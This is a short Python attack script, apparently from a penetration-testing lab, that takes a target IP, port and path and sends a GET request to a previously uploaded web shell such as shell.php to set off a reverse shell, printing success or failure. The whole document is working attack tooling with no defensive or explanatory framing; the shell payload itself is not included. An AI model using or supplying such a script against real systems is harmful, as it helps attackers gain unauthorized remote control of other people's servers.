import requests
import sys

# Function to trigger the reverse shell
def trigger_reverse_shell(target_ip, target_port, shell_path):
    # Construct the URL to trigger the shell
    url = f"http://{target_ip}:{target_port}/{shell_path}"
    
    try:
        print(f"[+] Sending request to {url}")
        # Send a GET request to the shell URL
        response = requests.get(url)
        
        if response.status_code == 200:
            print("[+] Reverse shell triggered successfully!")
        else:
            print(f"[-] Failed to trigger shell. HTTP status code: {response.status_code}")
    except Exception as e:
        print(f"[-] Error triggering shell: {e}")

# Main function to execute the script
def main():
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port> <shell_path>")
        print("Example: python3 trigger_shell.py 192.168.65.136 80 shell.php")
        sys.exit(1)

    # Get the target IP, port, and shell path from command-line arguments
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    shell_path = sys.argv[3]

    # Trigger the reverse shell
    trigger_reverse_shell(target_ip, target_port, shell_path)

if __name__ == "__main__":
    main()
